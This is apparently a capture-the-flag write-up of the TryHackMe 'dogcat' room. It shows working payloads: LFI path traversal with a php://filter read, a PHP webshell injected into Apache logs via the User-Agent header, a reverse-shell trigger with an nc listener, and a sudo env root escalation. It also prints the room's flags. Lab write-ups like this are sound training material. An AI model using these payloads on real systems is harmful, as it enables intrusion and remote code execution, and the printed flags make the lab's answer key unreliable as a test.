# TryHackMe — dogcat Writeup
**By:** Zytoona  
**Room:** [dogcat](https://tryhackme.com/room/dogcat)  
**Difficulty:** Hard  

---

## Recon

```bash
nmap -sV -sC <TARGET_IP>
```

![nmap scan](screenshots/nmap.png)

---

## LFI — Source Code via PHP Filter

```
http://<TARGET_IP>/?view=cat/../../../../../var/www/html/index&ext=php://filter/convert.base64-encode/resource=cat/../../../../../var/www/html/index
```

![lfi base64](screenshots/lfi_base64.png)

Decoded the Base64 output and found the vulnerable PHP source.

![source code decoded](screenshots/source_decoded.png)

---

## Log Poisoning — RCE via User-Agent

Injected PHP webshell into Apache log using curl:

```bash
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' http://<TARGET_IP>
```

Triggered it via LFI:

```bash
curl 'http://<TARGET_IP>/?view=cat../../../../../var/log/apache2/access.log&ext=&cmd=whoami'
```

![rce whoami](screenshots/rce_whoami.png)

---

## Reverse Shell

```bash
# listener
nc -lnvp 4444
```

```bash
# trigger via curl
curl 'http://<TARGET_IP>/?view=cat../../../../../var/log/apache2/access.log&ext=&cmd=<URL_ENCODED_REVSHELL>'
```

![reverse shell](screenshots/revshell.png)

---

## Flag 2

```bash
cd ..
cat flag2_QMW7JvaY2LvK.txt
```

![flag2](screenshots/flag2.png)

```
THM{LF1_t0_RC3_aec3fb}
```

---

## Privilege Escalation

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/env

sudo env /bin/sh
```

![privesc](screenshots/privesc.png)

---

## Root Flag

```
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

![root flag](screenshots/root_flag.png)
